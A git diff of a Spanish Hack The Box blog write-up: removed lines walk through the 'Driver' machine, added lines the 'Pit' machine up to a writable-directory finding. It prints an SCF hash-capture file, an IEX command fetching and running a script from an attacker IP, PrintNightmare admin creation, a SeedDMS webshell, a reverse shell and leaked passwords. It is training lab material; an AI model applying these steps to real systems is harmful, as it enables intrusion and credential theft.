@@ -5,7 +5,7 @@ excerpt: "Es una máquina fácil de Hack The Box que presenta un portal web con 
 date: 2025-11-03
 classes: wide
 header:
-  teaser: /assets/images/htb-writeup-Driver/Driver.png
+  teaser: /assets/images/htb-writeup-Pit/pit.png
   teaser_home_page: true
   icon: /assets/images/hackthebox.webp
 categories:
@@ -41,7 +41,7 @@ tags:
     width: 90%;
     max-width: 400px;
     height: 300px;
-    background-image: url("/assets/images/htb-writeup-Driver/Driver.png");
+    background-image: url("/assets/images/htb-writeup-Pit/pit.png");
     background-size: cover;
     background-position: center;
     margin: 2rem auto 1rem auto;
@@ -55,7 +55,7 @@ tags:
     left: 0;
     width: 100%;
     height: 100%;
-    background-image: url("/assets/images/htb-writeup-Driver/Driver.png");
+    background-image: url("/assets/images/htb-writeup-Pit/pit.png");
     background-size: cover;
     background-position: center;
     opacity: 0.5;
@@ -180,294 +180,259 @@ ff02::2         ip6-allrouters
 10.10.10.241 dms-pit.htb pit.htb
 ```
 
+## Enumeración WEB
 
+La página web de la máquina era la siguiente:
 
-```bash
-Nmap scan report for 10.10.11.106
-Host is up, received user-set (0.26s latency).
-Scanned at 2025-08-27 17:44:58 CST for 14s
+![](/assets/images/htb-writeup-Pit/nginx.png)
 
-PORT      STATE    SERVICE      REASON          VERSION
-80/tcp    open     http         syn-ack ttl 127 Microsoft IIS httpd 10.0
-135/tcp   open     msrpc        syn-ack ttl 127 Microsoft Windows RPC
-445/tcp   open     microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
-5985/tcp  open     http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-47001/tcp filtered winrm        no-response
-Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows
-```
-## Enumeración WEB 
+Tras realizar una enumeración básica, no identifiqué nada relevante. Al revisar el puerto 9090 de la máquina, identifiqué un login de CentOS.
 
-Al ingresar a la pagina web de la máquina veo que hay un login, al cual pude ingresar con las credenciales `admin:admin`
+![](/assets/images/htb-writeup-Pit/centos.png)
 
-![](/assets/images/htb-writeup-Driver/login.png)
+Buscando la imagen en Google, vi que se trata de la tecnología **Cockpit**. Por el nombre que tiene parece que va a ser clave para la explotación
 
-![](/assets/images/htb-writeup-Driver/dash.png)
+![](/assets/images/htb-writeup-Pit/google.png)
 
-Con whatweb obtuve la sig. información
+Tras continuar enumerando no identifique algo de utilidad por lo que realice un escaneo de puertos UDP e identifique el siguiente puerto abierto: 
+
+- 161 SNMP
 
 ```bash
-──(root💀kali)-[/home/kali]
-└─# whatweb http://10.10.11.106/                                                                                                                          1 ⨯
-http://10.10.11.106/ [401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.106], Microsoft-IIS[10.0], PHP[7.3.25], WWW-Authenticate[MFP Firmware Update Center. Please enter password for admin][Basic], X-Powered-By[PHP/7.3.25]
-```
-Navegando en el sitio web en la sección `Firmware updates` se indica que se seleccione el modelo de la impresora y se cargara la actualización de firmware correspondiente en su recurso compartido de archivos y su equipo lo revisara manualmente. Dado que cada archivo se revisa manualmente y se carga en un recurso compartido SMB, podríamos cargar un archivo que, al ejecutarse, se conecte a nuestra máquina local mediante SMB, lo que nos permite obtener un hash NTLM.
+Nmap scan report for 10.10.10.241
+Host is up, received user-set (0.23s latency).
+Scanned at 2025-06-18 02:13:17 EDT for 0s
 
-Para lograrlo cargue un archivo scf, primero cree el archivo scf con el siguiente contenido
+PORT    STATE SERVICE REASON              VERSION
+161/udp open  snmp    udp-response ttl 63 SNMPv1 server; net-snmp SNMPv3 server (public)
+Service Info: Host: pit.htb
+```
+
+Para enumerar SNMP utilice la string por defecto *public* desde la raiz 
 
 ```bash
 ┌──(root㉿kali)-[/home/kali]
-└─# cat p3rr1n.scf 
-[Shell]
-Command=2
-IconFile=\\10.10.16.8\share\pentestlab.ico
-[Taskbar]
-Command=ToggleDesktop
+└─# snmpbulkwalk -v2c -c public 10.10.10.241 1 > snmpout3
 ```
-Posteriormente cree un recurso compartido con impacket
+
+Una vez generado el archivo, busqué palabras clave y logré identificar la ruta absoluta de la instalación del servidor web
+*/var/www/html/seeddms51x/seeddms*
 
 ```bash
 ┌──(root㉿kali)-[/home/kali]
-└─# impacket-smbserver smbFolder $(pwd) -smb2support
-Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
-
-[*] Config file parsed
-[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
-[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
-[*] Config file parsed
-[*] Config file parsed
+└─# grep -iE "http|https|var|www" snmpout3
+iso.3.6.1.2.1.25.4.2.1.4.14847 = STRING: "php-fpm: pool www"
+iso.3.6.1.2.1.25.4.2.1.4.14848 = STRING: "php-fpm: pool www"
+iso.3.6.1.2.1.25.4.2.1.4.14849 = STRING: "php-fpm: pool www"
+iso.3.6.1.2.1.25.4.2.1.4.14850 = STRING: "php-fpm: pool www"
+iso.3.6.1.2.1.25.4.2.1.4.14851 = STRING: "php-fpm: pool www"
+iso.3.6.1.4.1.2021.9.1.2.2 = STRING: "/var/www/html/seeddms51x/seeddms"
+iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.27 = No more variables left in this MIB View (It is past the end of the MIB tree)
 ```
-Después cargue el archivo scf mediante el sitio web
 
-![](/assets/images/htb-writeup-Driver/scf.png)
+Al probar la ruta en ambos servicios web del dominio `pit.htb`, no se cargó ninguna vista. Sin embargo, al colocarla en el subdominio identificado previamente `dms-pit.htb`, se desplegó un panel de inicio de sesión correspondiente a la tecnología SeedDMS
 
-Una vez cargado el archivo recibí un hash NTLMV2 
+![](/assets/images/htb-writeup-Pit/seed.png)
+
+Continuando enumerando la salida de `snmpbulkwalk` identifique un posible usuario `michelle`
+
+```bash
+System release info
+CentOS Linux release 8.3.2011
+SELinux Settings
+user
+
+                Labeling   MLS/       MLS/                          
+SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles
+
+guest_u         user       s0         s0                             guest_r
+root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
+staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
+sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
+system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
+unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
+user_u          user       s0         s0                             user_r
+xguest_u        user       s0         s0                             xguest_r
+login
+
+Login Name           SELinux User         MLS/MCS Range        Service
+
+__default__          unconfined_u         s0-s0:c0.c1023       *
+michelle             user_u               s0                   *
+root                 unconfined_u         s0-s0:c0.c1023       *
+System uptime
+```
+
+probando el usuario `michelle` como usuario y contraseña pude acceder al portal
+
+![](/assets/images/htb-writeup-Pit/mic.png)
+
+Revisando la nota dentro del panel del portal se indica que se actualizo a la versión 5.1.15 de SeedDMS lo cual se puede confirmar dando click a la nota ya que se descarga el archivo CHANGELOG 
 
 ```bash
 ┌──(root㉿kali)-[/home/kali]
-└─# impacket-smbserver smbFolder $(pwd) -smb2support
-Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+└─# head -n 30 Downloads/CHANGELOG 
+--------------------------------------------------------------------------------
+                     Changes in version 5.1.15
+--------------------------------------------------------------------------------
+- Improved import from file system
+- HTTP Proxy for access on external extension repository can be set
+- Do not use unzip in ExtensionMgr anymore
+- fix version compare on info page
+- allow one page mode on search page
+- fix import of older extension versions from repository
 
-[*] Config file parsed
-[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
-[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
-[*] Config file parsed
-[*] Config file parsed
-[*] Incoming connection (10.10.11.106,49414)
-[*] AUTHENTICATE_MESSAGE (DRIVER\tony,DRIVER)
-[*] User DRIVER\tony authenticated successfully
-[*] tony::DRIVER:aaaaaaaaaaaaaaaa:a38c4685625798836643bb67105090a9:01010000000000000023be4db817dc01318aab9a9905c7fd0000000001001000660055006e005800730048004300530003001000660055006e0058007300480043005300020010004e0073006f005400540064004d007600040010004e0073006f005400540064004d007600070008000023be4db817dc0106000400020000000800300030000000000000000000000000200000620a3522667d43df34d81782dc8ce426d74ffefe68391e1674661ec400432bef0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003800000000000000000000000000
-[*] Connecting Share(1:IPC$)
-[-] SMB2_TREE_CONNECT not found share
-[-] SMB2_TREE_CONNECT not found share
-[*] Disconnecting Share(1:IPC$)
-[*] Closing down connection (10.10.11.106,49414)
-[*] Remaining connections []
+--------------------------------------------------------------------------------
+                     Changes in version 5.1.14
+--------------------------------------------------------------------------------
+- allow mimetype to specify documents which can be edited online
+- show number of indexing tasks in progress bar
+- fix comparison of last indexing time with creation date of document content
+- new hooks leftContentPre and leftContentPost
+- minimize sql queries when fetching sub folders and documents of a folder
+- custom attributes can be validated in a hook
+- document attributes comment, keywords, categories, expiration date, and sequence
+  can be turned off in the configuration
+- workflows can be turned off completely
+- Extension can be enabled/disabled in the extension manager, the previously
+  used method by setting a parameter in the extension's config file will no
+  longer work.
+- clean up code for managing extensions
+- fix renaming of folders via webdav
+- fix list of expired documents on MyDocuments page
+- pass showtree to ViewDocument (Closes: #462)
+- fix upgrade script for sqlite3
 ```
-Posteriormente rompí el hash con john 
+
+Buscando vulnerabilidades para SeedDMS encontré `CVE-2019-12744` lo cual permite un RCE mediante la carga de un archivo no validado, esto se soluciona agregando el archivo .htaccess en apache pero como se trata de un servidor nginx es posible que este presente.
+
+Para la explotación seguí la PoC de ExploitDB https://www.exploit-db.com/exploits/47022 para cargar mi archivo me coloque dentro del directorio de `michelle` y cargue una webshell
+
+![](/assets/images/htb-writeup-Pit/ws.png)
+
+Posteriormente debo consultar el archivo para poder llevar acabo la ejecución de comandos, para este punto al hacer hover sobre el documento se ve su ID en este caso 29
+
+![](/assets/images/htb-writeup-Pit/29.png)
+
+Finalmente pude ejecutar comandos mediante la web shell 
+
+![](/assets/images/htb-writeup-Pit/passwd.png)
+
+En este punto me di cuenta que al intentar ejecutar otros comandos no recibo ninguna salida
+
+![](/assets/images/htb-writeup-Pit/salida.png)
+
+## TTYOverHttp
+
+En ocasiones como estas cuando tenemos la ejecución remota de comandos mediante una web shell pero hay reglas configuradas (**Ej: iptables**) que nos impiden obtener una Reverse Shell se puede usar la herramienta `TTYOverHttp` para obtener una TTY completamente interactiva y desde hay generar una reverse shell.
+
+Para que funcione se debe agregar la ruta donde reside la web shell en el archivo de la herramienta y ejecutarla
 
 ```bash
-┌──(root㉿kali)-[/home/kali]
-└─# john hash --wordlist=/usr/share/wordlists/rockyou.txt 
-Created directory: /root/.john
-Using default input encoding: UTF-8
-Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
-Will run 4 OpenMP threads
-Press 'q' or Ctrl-C to abort, almost any other key for status
-liltony          (tony)     
-1g 0:00:00:00 DONE (2025-08-27 21:18) 50.00g/s 1638Kp/s 1638Kc/s 1638KC/s !!!!!!..eatme1
-Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
-Session completed. 
-```
-Después valide las credenciales en SMB y WINRM y funcionaron 
-
-```bash
-┌──(root㉿kali)-[/home/kali]
-└─# nxc smb 10.10.11.106 -u 'tony' -p 'liltony'
-SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Build 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True) 
-SMB         10.10.11.106    445    DRIVER           [+] DRIVER\tony:liltony 
-                                                                                                                                                             
-┌──(root㉿kali)-[/home/kali]
-└─# nxc winrm 10.10.11.106 -u 'tony' -p 'liltony'
-WINRM       10.10.11.106    5985   DRIVER           [*] Windows 10 Build 10240 (name:DRIVER) (domain:DRIVER)
-/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
-  arc4 = algorithms.ARC4(self._key)
-WINRM       10.10.11.106    5985   DRIVER           [+] DRIVER\tony:liltony (Pwn3d!)
+result = (requests.get('http://dms-pit.htb/seeddms51x/data/1048576/37/1.php', params=payload, timeout=5).text).strip()
+result = (requests.get('http://dms-pit.htb/seeddms51x/data/1048576/37/1.php', params=payload, timeout=5).text).strip()
 ```
 
 ```bash
-┌──(root㉿kali)-[/home/kali]
-└─# evil-winrm -i 10.10.11.106 -u 'tony' -p 'liltony'
-                                        
-Evil-WinRM shell v3.7
-                                        
-Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
-                                        
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-                                        
-Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\tony\Documents> whoami
-driver\tony
+┌──(root㉿kali)-[/opt/ttyoverhttp]
+└─# python3 tty_over_http.py    
+> whoami
+> nginx
 ```
+
+Una vez ejecutado, realizando una enumeración me encontré con un archivo interesante `settings.xml` del cual identifique credenciales
+
+```bash
+<database dbDriver="mysql" dbHostname="localhost" dbDatabase="seeddms" dbUser="seeddms" dbPass="ied^ieY6xoquu" doNotCheckVersion="false">
+```
+
+La contraseña identificada previamente me ayudo a iniciar sesión en el portal de centOS usando el usuario michelle
+
+![](/assets/images/htb-writeup-Pit/system.png)
+
+Algo que llamo mi atención fue la sección terminal, al ingresar me carga una terminal donde pude enviarme una reverse shell
+
+![](/assets/images/htb-writeup-Pit/terminal.png)
+
+```bash
+┌──(root㉿kali)-[/opt/Reverse_Shells]
+└─# nc -lvp 443
+listening on [any] 443 ...
+connect to [10.10.16.3] from dms-pit.htb [10.10.10.241] 56504
+script /dev/null -c bash
+Script started, file is /dev/null
+[michelle@pit ~]$ 
+```
+
+Para trabajar mas comodo realice un tratamiento de la TTY
+
+```bash
+┌──(root㉿kali)-[/opt/Reverse_Shells]
+└─# nc -lvp 443
+listening on [any] 443 ...
+connect to [10.10.16.3] from dms-pit.htb [10.10.10.241] 56504
+script /dev/null -c bash
+Script started, file is /dev/null
+[michelle@pit ~]$ ^Z
+zsh: suspended  nc -lvp 443
+
+┌──(root㉿kali)-[/opt/Reverse_Shells]
+└─# stty raw -echo;fg
+[1]  + continued  nc -lvp 443
+                             reset
+[michelle@pit ~]$ export TERM=xterm
+[michelle@pit ~]$ export SHELL=bash
+[michelle@pit ~]$ 
+```
+
 ## Escalada de privilegios
 
-Para enumerar le sistema utilice PowerUp.ps1 para evitar importar y después invocar el script le agregue al final del script la línea `Invoke-AllChecks` posteriormente coloque un servidor temporal con python y llame el script con IEX de esta manera cuando llegue al final de la línea ejecutara `Invoke-AllChecks` y recolectara toda la información del sistema 
+Enumerando nuevamente la salida de snmpwalk veo que se ejecuta un comando: 
 
 ```bash
-*Evil-WinRM* PS C:\Users\tony\Documents> IEX(New-Object Net.WebClient).downloadString('http://10.10.16.8/PowerUp.ps1')
-Access denied 
-At line:2066 char:21
-+     $VulnServices = Get-WmiObject -Class win32_service | Where-Object ...
-+                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
-    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand
-Access denied 
-At line:2133 char:5
-+     Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pat ...
-+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
-    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand
-Cannot open Service Control Manager on computer '.'. This operation might require other privileges.
-At line:2189 char:5
-+     Get-Service | Test-ServiceDaclPermission -PermissionSet 'ChangeCo ...
-+     ~~~~~~~~~~~
-    + CategoryInfo          : NotSpecified: (:) [Get-Service], InvalidOperationException
-    + FullyQualifiedErrorId : System.InvalidOperationException,Microsoft.PowerShell.Commands.GetServiceCommand
-
-
-DefaultDomainName    : DRIVER
-DefaultUserName      : tony
-DefaultPassword      :
-AltDefaultDomainName :
-AltDefaultUserName   :
-AltDefaultPassword   :
-Check                : Registry Autologons
-
-
-*Evil-WinRM* PS C:\Users\tony\Documents> 
-
-Si embargo, la ejecución no mostro mucho así que ejecute winpeas.exe  
-
-```bash
-PowerShell Settings
-    PowerShell v2 Version: 2.0
-    PowerShell v5 Version: 5.0.10240.17146
-    PowerShell Core Version: 
-    Transcription Settings: 
-    Module Logging Settings: 
-    Scriptblock Logging Settings: 
-    PS history file: C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
-    PS history size: 134B
-```
-Revisando el archivo `RICOH PCL6 UniversalDriver V4.23` veo que tiene algo de información sobre la impresora donde se incluye el nombre y la versión del driver  `RICOH PCL6 UniversalDriver V4.23` realizando una búsqueda identifiqué un exploit para este driver en metasploit, sin embargo también viendo los puertos TCP en escucha hay uno con un nombre de proceso peculiar`spoolsv`
-
-```bash
-  Enumerating IPv4 connections
-                                                     
-  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name
-
-  TCP        0.0.0.0               80            0.0.0.0               0               Listening         4               System
-  TCP        0.0.0.0               135           0.0.0.0               0               Listening         704             svchost
-  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
-  TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System
-  TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System
-  TCP        0.0.0.0               49408         0.0.0.0               0               Listening         464             wininit
-  TCP        0.0.0.0               49409         0.0.0.0               0               Listening         932             svchost
-  TCP        0.0.0.0               49410         0.0.0.0               0               Listening         1180            spoolsv
-  TCP        0.0.0.0               49411         0.0.0.0               0               Listening         816             svchost
-  TCP        0.0.0.0               49412         0.0.0.0               0               Listening         560             services
-  TCP        0.0.0.0               49413         0.0.0.0               0               Listening         568             lsass
-  TCP        10.10.11.106          139           0.0.0.0               0               Listening         4               System
-```
-Realizando una búsqueda de vulnerabilidades que afecten a este proceso hay una en particular llamada `PrintNightmare` para explotarla seguí esta PoC [PrintNightmare](https://github.com/JohnHammond/CVE-2021-34527) Primero cargue el script a la maquina victima
-
-```bash
-┌──(root㉿kali)-[/home/kali]
-└─# python3 -m http.server 80
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-10.10.11.106 - - [28/Aug/2025 15:29:14] "GET /CVE-2021-34527.ps1 HTTP/1.1" 200 -
-```
-Una vez que lo llame no aparece al ejecutar dir sin embargo para ejecutar el script y poder crear un usuario que este dentro del grupo administradores debe ejecutarse:
-
-```bash
-Invoke-Nightmare -DriverName "Xerox" -NewUser "p3rr1n" -NewPassword "Admin123."
-```
-```bash
-*Evil-WinRM* PS C:\windows\temp\privesc> Invoke-Nightmare -DriverName "Xerox" -NewUser "p3rr1n" -NewPassword "Admin123."
-[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
-[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
-[+] added user p3rr1n as local administrator
-[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
-```
-```bash
-*Evil-WinRM* PS C:\windows\temp\privesc> net users
-
-User accounts for \\
-
--------------------------------------------------------------------------------
-Administrator            DefaultAccount           Guest
-john                     p3rr1n                   tony
-The command completed with one or more errors.
-
-*Evil-WinRM* PS C:\windows\temp\privesc> net user p3rr1n
-User name                    p3rr1n
-Full Name                    p3rr1n
-Comment
-User's comment
-Country/region code          000 (System Default)
-Account active               Yes
-Account expires              Never
-
-Password last set            8/28/2025 8:09:00 PM
-Password expires             Never
-Password changeable          8/28/2025 8:09:00 PM
-Password required            Yes
-User may change password     Yes
-
-Workstations allowed         All
-Logon script
-User profile
-Home directory
-Last logon                   Never
-
-Logon hours allowed          All
-
-Local Group Memberships      *Administrators
-Global Group memberships     *None
-The command completed successfully.
-```
-Después valide las credenciales con netexec y veo que tengo un pwned en SMB
-
-```bash
-┌──(root㉿kali)-[/home/kali]
-└─# nxc smb 10.10.11.106 -u 'p3rr1n' -p 'Admin123.'
-SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Build 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True) 
-SMB         10.10.11.106    445    DRIVER           [+] DRIVER\p3rr1n:Admin123. (Pwn3d!)
-```
-Para poder obtener una shell utilice psexec
-
-```bash
-┌──(root㉿kali)-[/home/kali]
-└─# impacket-psexec WORKGROUP/p3rr1n@10.10.11.106 cmd.exe
-Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
-
-Password:
-[*] Requesting shares on 10.10.11.106.....
-[*] Found writable share ADMIN$
-[*] Uploading file thPGyUDV.exe
-[*] Opening SVCManager on 10.10.11.106.....
-[*] Creating service ZICz on 10.10.11.106.....
-[*] Starting service ZICz.....
-[!] Press help for extra shell commands
-Microsoft Windows [Version 10.0.10240]
-(c) 2015 Microsoft Corporation. All rights reserved.
-
-C:\Windows\system32> whoami
-nt authority\system
-
-C:\Windows\system32> 
+iso.3.6.1.4.1.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 = STRING: "/usr/bin/monitor"
 ```
 
+Al revisar este comando desde la shell veo que se trata de un script
 
+```bash
+[michelle@pit ~]$ cat /usr/bin/monitor
+#!/bin/bash
 
+for script in /usr/local/monitoring/check*sh
+do
+    /bin/bash $script
+done
+[michelle@pit ~]$ 
+```
+
+Situándome en el directorio `/usr/bin/monitor` no me deja listar los archivos sin embargo si pude crear uno
+
+```bash
+[michelle@pit ~]$ cd /usr/local/monitoring/
+[michelle@pit monitoring]$ ls -la
+ls: cannot open directory '.': Permission denied
+[michelle@pit monitoring]$ pwd
+/usr/local/monitoring
+[michelle@pit monitoring]$ touch test
+[michelle@pit monitoring]$ echo 'test' > test
+[michelle@pit monitoring]$ cat test
+test
+```
+Al ejecutar revisar los permisos del directorio monitoring veo que tiene un `+` lo cual significa que este directorio tiene ACLs (Access Control List) adicionales así que ejecute el comando  `getfacl` y pude ver que el usuario `michelle` tiene permisos de escritura y ejecución en el directorio `monitoring` lo cual justifica por que puedo crear archivos
+
+```bash
+[michelle@pit local]$ getfacl monitoring/
+# file: monitoring/
+# owner: root
+# group: root
+user::rwx
+user:michelle:-wx
+group::rwx
+mask::rwx
+other::---
+
+[michelle@pit local]$ 
+```
 
 
